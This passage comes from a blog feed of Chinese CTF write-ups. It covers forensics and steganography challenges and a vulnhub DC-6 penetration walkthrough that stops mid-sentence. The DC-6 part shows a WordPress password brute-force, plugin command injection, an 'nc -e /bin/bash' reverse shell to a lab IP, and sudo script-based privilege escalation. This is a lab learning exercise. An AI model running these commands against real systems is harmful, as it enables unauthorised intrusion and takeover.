Record在$MFT文件中物理上是连续的，且从0开始编号，每个MFT项的前部几十个字节有着固定的头结构，用来描述本MFT项的相关信息。后面的字节存放着“属性”。</code></pre><p>为了更直接的读取MFT文件中的信息 我们使用下面这个项目  可以将MFT中的信息进行解析  并将结果保存在csv表格文件中</p><p><a href="https://github.com/jschicht/Mft2Csv">Mft2Csv</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131723127.png" alt="image-20240313172337050"></p><p>打开第一个表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131724670.png" alt="image-20240313172408605"></p><p>使用nc 连接docker容器</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131724852.png" alt="image-20240313172442588"></p><p>第一个问题</p><pre><code>Files are related to two years, which are those? (for example: 1993,1995)</code></pre><p>直接在表格里面看 看到两个文件夹 一个名为2023 一个名为2024 那就是这两个年份</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131740311.png" alt="image-20240313174026188"></p><pre><code>2023,2024</code></pre><p>第二个问题</p><pre><code>There are some documents, which is the name of the first file written? (for example: randomname.pdf)</code></pre><p>问的是第一个写入的文件名是  这个直接在表格里面找到第一个出现的文件即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131741366.png" alt="image-20240313174159253"></p><pre><code>Final_Annual_Report.xlsx</code></pre><p>第三个问题</p><pre><code>Which file was deleted? (for example: randomname.pdf)</code></pre><p>问的是哪个文件被删除了 这个其实就是找不同 在表格列出的文件中 可以看到<code>Marketing_Plan.xlsx</code>这个文件 第六列的数字是2  但是其他文件都是1 找到对应列的属性 是<code>HEADER_SequenceNo</code>  我们大概可以理解为是一个状态码 2表示这个文件是删除状态</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131745378.png" alt="image-20240313174556256"></p><pre><code>Marketing_Plan.xlsx</code></pre><p>第四个问题</p><pre><code>How many of them have been set in Hidden mode? (for example: 43)</code></pre><p>问的是有多少个文件处在被隐藏状态 第15列的属性是<code>SI_FilePermission</code> 表示文件权限 找到<code>credentials.txt</code>  这个文件在第15列的值是<code>hidden</code> 表明这个文件此时是处在隐藏状态  在所有文件中 只有这一个文件在第15列的值是<code>hidden</code> 因此 只有1个文件处在隐藏状态</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403131751419.png" alt="image-20240313175137292"></p><pre><code>1</code></pre><p>第五个问题</p><pre><code>Which is the filename of the important TXT file that was created? (for example: randomname.txt)</code></pre><p>问的是被创建的重要的txt文件格式的文件名是什么</p><p>只有一个txt文件类型的文件  就是上一题的<code>credentials.txt</code></p><pre><code>credentials.txt</code></pre><p>第六个问题</p><pre><code>A file was also copied, which is the new filename? (for example: randomname.pdf)</code></pre><p>问的是被复制的文件的文件名是什么  也是观察文件的属性 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132109266.png" alt="image-20240313210919189"></p><p>注意到这个值 其他文件都是0 那这个属性应该就是代表着被复制过的文件</p><pre><code>Financial_Statement_draft.xlsx</code></pre><p>第七个问题</p><pre><code>Which file was modified after creation? (for example: randomname.pdf)</code></pre><p>问的是哪个文件在创建后被修改 这个就是观察时间即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132114714.png" alt="image-20240313211413625"></p><p>只有<code>Project_Proposal.pdf</code>的时间发生了改变  那就是在第一次写入或者保存之后被修改了</p><pre><code>Project_Proposal.pdf</code></pre><p>第八个问题</p><pre><code>What is the name of the file located at record number 45? (for example: randomname.pdf)</code></pre><p>问的就是文件编号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132115001.png" alt="image-20240313211553934"></p><pre><code>Annual_Report.xlsx</code></pre><p>第九个问题</p><pre><code>What is the size of the file located at record number 40? (for example: 1337)</code></pre><p>问的是编号40的文件的文件大小</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132116100.png" alt="image-20240313211641061"></p><pre><code>57344</code></pre><p>答完所有问题之后 成功拿到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403132117686.png" alt="image-20240313211708636"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTBCyberCTF2024&quot;&gt;&lt;a href=&quot;#HTBCyberCTF2024&quot; class=&quot;headerlink&quot; title=&quot;HTBCyberCTF2024&quot;&gt;&lt;/a&gt;HTBCyberCTF2024&lt;/h1&gt;&lt;h2 id=&quot;Forensics-部分&quot;</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2023年中国工业互联网安全大赛决赛-misc</title>
    <link href="http://w3nx1z1.github.io/2024/03/03/2023%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-misc/"/>
    <id>http://w3nx1z1.github.io/2024/03/03/2023%E5%B9%B4%E4%B8%AD%E5%9B%BD%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B-misc/</id>
    <published>2024-03-03T12:36:18.167Z</published>
    <updated>2024-03-03T12:41:55.910Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2023年中国工业互联网安全大赛决赛-misc"><a href="#2023年中国工业互联网安全大赛决赛-misc" class="headerlink" title="2023年中国工业互联网安全大赛决赛-misc"></a>2023年中国工业互联网安全大赛决赛-misc</h1><pre><code>刷csdn看到了这个比赛 顺手下了附件也来做一做</code></pre><h2 id="DNS-Query-DNS流量提取数据-二维码"><a href="#DNS-Query-DNS流量提取数据-二维码" class="headerlink" title="DNS_Query(DNS流量提取数据 二维码)"></a>DNS_Query(DNS流量提取数据 二维码)</h2><p>拿到一个dns流量 看到info里面有东西</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011416656.png" alt="image-20240301141629512"></p><p>但是每两条里面的info都是一样的 那我们先过滤一下</p><pre><code>frame.len == 142</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011417055.png" alt="image-20240301141757969"></p><p>写tshark语句把里面的信息提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011418609.png" alt="image-20240301141844558"></p><pre><code>tshark -r DNS_Query.pcapng -T fields -Y &quot;frame.len == 142&quot; -e &quot;dns.qry.name&quot; | awk &#39;&#123;print substr($0,0,29)&#125;&#39; | tr -d &#39;\n&#39; &gt;data.txt</code></pre><pre><code>-Y 是筛选数据包-e 由上图可以看到我们想要提取的数据是在queries的name字段的awk 对提取出来的文本进行处理 提取从第一个字符开始的连续29个字符 这里我们只需要数字部分tr 进一步处理将每行后面的换行符去掉</code></pre><p>猜测这段字符是二维码 写脚本进行转化</p><pre><code class="python">from PIL import Imagefrom zlib import *MAX = 29pic = Image.new(&quot;RGB&quot;, (MAX, MAX))str1 = &quot;1111111010011110010010111111110000010011001100001101000001101110100010111100111010111011011101000001100011010101110110111010010100100011001011101100000100010110001001010000011111111010101010101010111111100000000101101101001000000000110110100111000101011010000011101110111001001101110011110001100111001101110110110011000101010010111101111001100110111111001111011011001101110001110001101010001010000101111001011010111111111100011001001011100110111110011101001111010110001110100001111001110001001111000001111101111110101100001101101110010111011101111000111011101101011100000000000101111100110000101001011111111010000000010100101101110001010011111110001010010101101011100100000100100001001001000100001011101011100111001111111001010111010111010110111100101001101110100100001100010000100111000001010101111100101111110111111110110110010000100010000&quot;i = 0for y in range(0, MAX):    for x in range(0, MAX):        if str1[i] == &#39;1&#39;:            pic.putpixel([x, y], (0, 0, 0))        else:            pic.putpixel([x, y], (255, 255, 255))        i = i+1pic.show()pic.save(&quot;flag.png&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011422724.png" alt="image-20240301142248689"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011423480.png" alt="image-20240301142320432"></p><h2 id="gigached-lsb隐写-AES加解密"><a href="#gigached-lsb隐写-AES加解密" class="headerlink" title="gigached(lsb隐写 AES加解密)"></a>gigached(lsb隐写 AES加解密)</h2><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011423883.png" alt="image-20240301142346826"></p><p>压缩包里面有注释 应该是一段加密逻辑 但是我拿到的附件是已经被解压的了 只能看wp里面的了</p><pre><code class="python">def encrypt(key, source):    source = source.encode()    key = key.encode()    key = SHA256.new(key).digest()    IV = Random.new().read(AES.block_size)     encryptor = AES.new(key, AES.MODE_CBC, IV)    padding = AES.block_size - len(source) % AES.block_size      source += bytes([padding]) * padding      data = IV + encryptor.encrypt(source)      return data</code></pre><p>给的这个文件 先看一下类型 是一个iso media</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011712296.png" alt="image-20240301171240260"></p><p>改个后缀名 使用ffmpeg或者foremost 进行分帧 题目介绍是lsb on movie 那视频文件没法进行lsb隐写 估计是在视频的某几帧里面进行lsb隐写</p><pre><code>foremost gigached     或者ffmpeg -i gigached ./output/outr%04d.png</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403011941137.png" alt="image-20240301194149977"></p><p>直接使用stegsolve或者zsteg提取隐藏信息就可以了</p><pre><code>8:dp6UYHfO8:NZhyAEYx8:Js8o30248:l+je3k5k8:aJmsL+Hx8:w43oQ3oz8:XjTT3/LQ8:qF4fuu/w8:MNqZVqiA8:Q3vzixxY8:QYbnuQ==8: the key8: isgYpt38:GvM7X1A13:CoT</code></pre><p>将这个内容写入<code>1.txt</code> 写个脚本处理一下</p><pre><code class="python">with open(&quot;1.txt&quot;, &#39;r+&#39;) as f:    line = f.readlines()    new_lines = []    for i in line:        i = i[2:10:1]        new_lines.append(i)    f.writelines(new_lines)</code></pre><pre><code>dp6UYHfONZhyAEYxJs8o3024l+je3k5kaJmsL+Hxw43oQ3ozXjTT3/LQqF4fuu/wMNqZVqiAQ3vzixxYQYbnuQ== the key isgYpt3GvM7X1A1CoT</code></pre><p>根据前面的加密方式写解密脚本</p><pre><code class="python">from Crypto.Cipher import AESfrom Crypto.Hash import SHA256from Crypto import Randomimport base64def decrypt(key, data):    data = base64.b64decode(data)    key = key.encode()    key = SHA256.new(key).digest()    IV = data[:AES.block_size]    decryptor = AES.new(key, AES.MODE_CBC, IV)    decrypted = decryptor.decrypt(data[AES.block_size:])    padding_length = decrypted[-1]    decrypted = decrypted[:-padding_length]    return decrypted.decode()encrypted_data = &quot;dp6UYHfONZhyAEYxJs8o3024l+je3k5kaJmsL+Hxw43oQ3ozXjTT3/LQqF4fuu/wMNqZVqiAQ3vzixxYQYbnuQ==&quot;key = &quot;gYpt3GvM7X1A1CoT&quot;decrypted_text = decrypt(key, encrypted_data)print(decrypted_text)# flag&#123;d53dbf36-444a-471d-a663-91a9e6f400e0&#125;</code></pre><h2 id="hellofromspace-udp流量提取图片-图片异或"><a href="#hellofromspace-udp流量提取图片-图片异或" class="headerlink" title="hellofromspace(udp流量提取图片 图片异或)"></a>hellofromspace(udp流量提取图片 图片异或)</h2><p>打开流量包 看一下协议分级 基本上全是UDP 那就直接追踪一下UDP流 看到两部分flag 一个在<code>flag_part1.txt</code>中 一个在<code>flag_part2.png</code>中 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021615238.png" alt="image-20240302161547156"></p><p>追踪udp流发现只有一个流 第一部分flag可以直接在里面搜出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021623120.png" alt="image-20240302162340041"></p><pre><code>flag&#123;c0ee07da-246d</code></pre><p>将数据形式改为原始数据 在010editor里面保存为新文件 <code>1.png</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021618493.png" alt="image-20240302161829428"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021629554.png" alt="image-20240302162905511"></p><p>看着有点不对劲  很明显是缺少了完整的图片结构 但是末尾也确实有正确的图片尾</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021631430.png" alt="image-20240302163127383"></p><p>猜测是中间的部分出了问题 返回去在看一下 图片头是出现在长度为1189的包中的 后面也有很多长度为1189的包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021632497.png" alt="image-20240302163215440"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021633081.png" alt="image-20240302163316025"></p><p>png头是从第12个字节出现的 观察下一个长度为1189的包 看到第10个字节数字加了1 看来是计数的 使用的是16进制计数法 顺序计数 那就不用再单独排序了 考虑到文件尾是出现在长度为289的包 那我们就筛选长度&gt;&#x3D;289的包</p><pre><code>udp &amp;&amp; frame.len &gt;= 289</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021636814.png" alt="image-20240302163643722"></p><p>tshark提一下数据</p><pre><code>tshark -r hello.pcapng -T fields -Y &quot;udp &amp;&amp; frame.len &gt;= 289&quot; -e &quot;data.data&quot; | awk &#39;&#123;print substr($0,23)&#125;&#39; &gt; hex.txt </code></pre><p>再把数据放在010里面转储为png图片 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021701046.png" alt="image-20240302170117632"></p><p>看起来和题目附件里面的<code>original.png</code>一样 猜测是双图盲水印  但尝试过后发现不是 是两张图片异或 使用stegsolve就可以 先打开一张图片 再点Analyse–Image Combiner</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021706412.png" alt="image-20240302170653378"><br>得到一张图片 隐隐约约看到后半段flag </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021707241.png" alt="image-20240302170757151"></p><p>将其保存下来 找个看的清楚的通道</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403021709425.png" alt="image-20240302170937373"></p><h2 id="threepages-苹果png解析bug-lsb隐写-js函数调用"><a href="#threepages-苹果png解析bug-lsb隐写-js函数调用" class="headerlink" title="threepages(苹果png解析bug lsb隐写 js函数调用)"></a>threepages(苹果png解析bug lsb隐写 js函数调用)</h2><p>拿到流量包 看一下http导出 关键的文件就是三个html文件<code>page1.html page2.html page3.html</code>  提取出来看看</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022123964.png" alt="image-20240302212349935"></p><p>得到key1</p><pre><code>f79accc3ae844981</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022044688.png" alt="image-20240302204431462"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022124478.png" alt="image-20240302212413361"></p><p>扫码得到一段话</p><pre><code>Do you know some picture will be displayed differently on different devices?</code></pre><p>指的是在不同设备上显示不同的图片 搜了一下 是苹果png解析bug</p><p><a href="https://moonvy.com/blog/post/2021/%E5%9C%A8%E4%B8%8D%E5%90%8C%E8%AE%BE%E5%A4%87%E4%B8%8A%E6%98%BE%E7%A4%BA%E4%B8%8D%E4%B8%80%E6%A0%B7%E5%86%85%E5%AE%B9%E7%9A%84%E7%A5%9E%E5%A5%87PNG%E5%9B%BE%E7%89%87/">在不同设备上显示不一样内容的神奇图片</a></p><p>找一个识别网站<a href="https://fotoforensics.com/">在线识别</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022134056.png" alt="image-20240302213418896"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022134489.png" alt="image-20240302213429375"></p><p>找个在线网站读一下条形码  <a href="https://online-barcode-reader.inliteresearch.com/default.aspx">在线读条形码</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403022137997.png" alt="image-20240302213748954"></p><pre><code>here is your key2: 818facca67289de2</code></pre><p>还提取出来一个<code>p2.png</code>  常规的png图片分析方法  看一下有没有lsb隐写 发现在alpha的全部通道均存在隐藏信息 </p><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032018849.png" alt="image-20240303201804803"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032018879.png" alt="image-20240303201812836"></p><p>选择<code>save bin</code> 将信息提取出来 解base64得到源码 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032019146.png" alt="image-20240303201911078"></p><p>我们查看page2.html的内容 发现影响返回值的结果的是<code>processDecrypt()</code>函数</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032024302.png" alt="image-20240303202438259"></p><p>源码里面有关于这个函数的内容</p><pre><code class="javascript">function processDecrypt()&#123;var r=document.getElementById(&quot;key1&quot;).value,e=document.getElementById(&quot;key2&quot;).value;let t=document.getElementById(&quot;message&quot;);try&#123;t.innerText=myDecrypt(r,e)&#125;catch(r)&#123;t.innerText=&quot;error&quot;&#125;&#125;</code></pre><p>那我们直接将我们得到的key1和key2赋予r和e两个参数即可</p><pre><code class="javascript">function processDecrypt()&#123;var r=&quot;f79accc3ae844981&quot;,e=&quot;818facca67289de2&quot;;let t=document.getElementById(&quot;message&quot;);try&#123;t.innerText=myDecrypt(r,e)&#125;catch(r)&#123;t.innerText=&quot;error&quot;&#125;&#125;</code></pre><p>直接将赋值后的代码替换掉源码里面的部分 替换后将源码的全部复制进控制台 在调用<code>processDecrypt()</code>函数即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202403032029143.png" alt="image-20240303202958990"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2023年中国工业互联网安全大赛决赛-misc&quot;&gt;&lt;a href=&quot;#2023年中国工业互联网安全大赛决赛-misc&quot; class=&quot;headerlink&quot; title=&quot;2023年中国工业互联网安全大赛决赛-misc&quot;&gt;&lt;/a&gt;2023年中国工业互联网安全大赛决</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场记录DC-6</title>
    <link href="http://w3nx1z1.github.io/2024/02/29/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-6/"/>
    <id>http://w3nx1z1.github.io/2024/02/29/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-6/</id>
    <published>2024-02-29T02:34:41.927Z</published>
    <updated>2024-02-29T02:34:42.007Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulnhub靶场DC-6"><a href="#vulnhub靶场DC-6" class="headerlink" title="vulnhub靶场DC-6"></a>vulnhub靶场DC-6</h1><h2 id="靶场描述"><a href="#靶场描述" class="headerlink" title="靶场描述"></a>靶场描述</h2><pre><code>DC-6 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.This isn&#39;t an overly difficult challenge so should be great for beginners.The ultimate goal of this challenge is to get root and to read the one and only flag.Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won&#39;t give you the answer, instead, I&#39;ll give you an idea about how to move forward.</code></pre><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>先使用nmap扫描靶机ip</p><pre><code>nmap 192.168.160.0/24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401171832816.png" alt="image-20240117183209736"></p><p>扫到ip为192.168.160.157 开放了22和80端口</p><p>在扫描靶机端口</p><pre><code>nmap -A -p- -v 192.168.160.157</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401171834090.png" alt="image-20240117183420041"></p><pre><code>开放22端口 存在ssh服务 OpenSSH版本 7.4p1开放80端口 存在web服务 使用Apache中间件 版本2.4.25</code></pre><h3 id="二、修改hosts文件-进行重定向"><a href="#二、修改hosts文件-进行重定向" class="headerlink" title="二、修改hosts文件 进行重定向"></a>二、修改hosts文件 进行重定向</h3><p>我们可以看到在扫到的80端口处 说明了不能直接定向到目标网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401181745520.png" alt="image-20240118174515479"></p><p>我们尝试访问网站  当然也是访问不了的 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401181744269.png" alt="image-20240118174402203"></p><p>那就需要我们修改本地hosts文件(&#x2F;etc&#x2F;hosts)  将ip和域名添加进去</p><pre><code>192.168.160.157 wordy</code></pre><p>就可以成功访问了 (访问192.168.160.157)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182157924.png" alt="image-20240118215758484"></p><p>能看到是一个wordpress的网站</p><h3 id="三、网站信息搜集"><a href="#三、网站信息搜集" class="headerlink" title="三、网站信息搜集"></a>三、网站信息搜集</h3><h4 id="使用whatweb看网站信息"><a href="#使用whatweb看网站信息" class="headerlink" title="使用whatweb看网站信息"></a>使用whatweb看网站信息</h4><pre><code>whatweb -v 192.168.160.157</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182158418.png" alt="image-20240118215835245"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182159742.png" alt="image-20240118215918499"></p><p>看到wordpress的版本是5.1.1</p><h4 id="使用dirsearch-py扫目录"><a href="#使用dirsearch-py扫目录" class="headerlink" title="使用dirsearch.py扫目录"></a>使用dirsearch.py扫目录</h4><pre><code>python3 ./dirsearch.py -u http://192.168.160.157</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182210224.png" alt="image-20240118221023088"></p><p>扫到了该网站wordpress的后台登陆页面 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182219850.png" alt="image-20240118221904796"></p><p>还扫到了一个目录页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182219324.png" alt="image-20240118221933265"></p><h4 id="使用cewl搜集网站登录密码"><a href="#使用cewl搜集网站登录密码" class="headerlink" title="使用cewl搜集网站登录密码"></a>使用cewl搜集网站登录密码</h4><p>既然扫到了网站后台登陆页面 我们就来搜集一波网站里面的密码 使用cewl</p><p>cewl的使用姿势在DC-2的文章中有提到<a href="https://w3nx1z1.github.io/2023/11/21/vulnhub%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95DC-2/">DC-2通关记录</a></p><pre><code>cewl http://wordy/ -w dc6dict.txt从网站中获取密码并将其保存在dc6dict.txt文件中</code></pre><h4 id="首页信息"><a href="#首页信息" class="headerlink" title="首页信息"></a>首页信息</h4><p>网站首页的信息提示我们可能与插件有关</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182232914.png" alt="image-20240118223258687"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182233611.png" alt="image-20240118223314553"></p><h3 id="四、wpscan爆破网站密码"><a href="#四、wpscan爆破网站密码" class="headerlink" title="四、wpscan爆破网站密码"></a>四、wpscan爆破网站密码</h3><p>我们已经有了网站密码字典 在使用wpscan扫一下网站用户名字典</p><pre><code>wpscan --url http://wordy/ -e u </code></pre><p>扫出来五个用户</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182238256.png" alt="image-20240118223810205"></p><p>制作一个用户名字典 写入这些用户名 使用wpscan开始爆破</p><pre><code>wpscan wpscan --url http://dc-2/ -P dc6dict.txt -U user.txt</code></pre><p>没爆出来 那我们换个字典 直接使用kali里面自带的字典<code>rockyou.txt</code> 并且作者在靶场下载页面处还给了一个提示 方便我们缩小密码字典范围 便于爆破</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182305673.png" alt="image-20240118230529591"></p><pre><code>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txtwpscan --url http://wordy/ -P passwords.txt -U user.txt </code></pre><p>爆破出一组账号密码<code>mark / helpdesk01</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182308006.png" alt="image-20240118230819959"></p><p>使用这组账号密码登陆 网站后台 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401182309959.png" alt="image-20240118230928877"></p><h3 id="五、漏洞发现与利用"><a href="#五、漏洞发现与利用" class="headerlink" title="五、漏洞发现与利用"></a>五、漏洞发现与利用</h3><h4 id="activity-monitor插件漏洞"><a href="#activity-monitor插件漏洞" class="headerlink" title="activity monitor插件漏洞"></a>activity monitor插件漏洞</h4><p>登陆进去之后 可以看到有一个<code>activity monitor</code> 插件 结合首页上的提示 猜测这个插件有漏洞</p><h5 id="方法一：使用searchsploit搜索漏洞利用脚本"><a href="#方法一：使用searchsploit搜索漏洞利用脚本" class="headerlink" title="方法一：使用searchsploit搜索漏洞利用脚本"></a>方法一：使用searchsploit搜索漏洞利用脚本</h5><p>直接使用searchsploit搜索漏洞脚本</p><pre><code>searchsploit activity monitor</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281609102.png" alt="image-20240228160910052"></p><p>直接找一下最后一个</p><pre><code>searchsploit -p 50110.py</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281609279.png" alt="image-20240228160944243"></p><pre><code>cp /usr/share/exploitdb/exploits/php/webapps/50110.py 50110.py</code></pre><p>看一下里面的内容 用法里面写着直接python运行就可以了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281627638.png" alt="image-20240228162714585"></p><p>成功拿到权限 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281629064.png" alt="image-20240228162938028"></p><p>为了便于操作 我们在反弹shell并创建一个新的交互式终端</p><pre><code>nc -e /bin/bash 192.168.160.131 4444   nc -lvvp 4444python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281939666.png" alt="image-20240228193904627"></p><h5 id="方法二：在页面插件处进行命令执行"><a href="#方法二：在页面插件处进行命令执行" class="headerlink" title="方法二：在页面插件处进行命令执行"></a>方法二：在页面插件处进行命令执行</h5><p>还是在插件的页面  我们找到了一处可以注入的点</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281916924.png" alt="image-20240228191642845"></p><p>lookup按钮会将填入的ip地址解析为主机名 我们尝试随便写一个ip地址并注入命令进行抓包测试</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402281922648.png" alt="image-20240228192247557"></p><p>很明显 后面我们注入的<code>ls</code>命令被成功执行了 那就可以在这个页面进行命令注入反弹shell 在创建一个交互式终端</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282016344.png" alt="image-20240228201634263"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282016870.png" alt="image-20240228201646830"></p><h3 id="六、提权-nmap提权"><a href="#六、提权-nmap提权" class="headerlink" title="六、提权(nmap提权)"></a>六、提权(nmap提权)</h3><p>在文件系统中进行翻找 在<code>/home/mark/stuff</code>文件夹下找到一个<code>things-to-do.txt</code>文件 读取文件内容</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282033562.png" alt="image-20240228203350516"></p><pre><code>Things to do:- Restore full functionality for the hyperdrive (need to speak to Jens)- Buy present for Sarah&#39;s farewell party- Add new user: graham - GSo7isUM1D4 - done- Apply for the OSCP course- Buy new laptop for Sarah&#39;s replacement</code></pre><p>在这里面找到了用户<code>graham</code>的登录密码<code>GSo7isUM1D4</code> 切换用户</p><p>查看可以使用的sudo权限命令</p><pre><code>sudo -l</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282057054.png" alt="image-20240228205758013"></p><p>发现这个<code>/home/jens/backups.sh</code>文件可以无密码执行  读一下内容</p><pre><code>#!/bin/bashtar -czf backups.tar.gz /var/www/html</code></pre><p>将<code>/bin/bash</code>写入这个文件 在运行 就可以获得jens权限的shell(因为backups.sh可以无密码运行)</p><pre><code class="bash">echo &quot;/bin/bash&quot; &gt;&gt;backups.shsudo -u jens /home/jens/backups.sh</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282109825.png" alt="image-20240228210914783"></p><p>再次查看jens用户拥有的sudo权限命令 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402282109205.png" alt="image-20240228210958162"></p><p>发现可以无密码使用nmap 直接找一下nmap提权</p><p><a href="https://blog.csdn.net/zijiaijd/article/details/117165224?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170912594416800197039668%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170912594416800197039668&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-117165224-null-null.142%5Ev99%5Epc_search_result_base9&utm_term=nmap%E6%8F%90%E6%9D%83&spm=1018.2226.3001.4187">nmap提权几种方式</a>  这里我们选择方法二  使用nmap 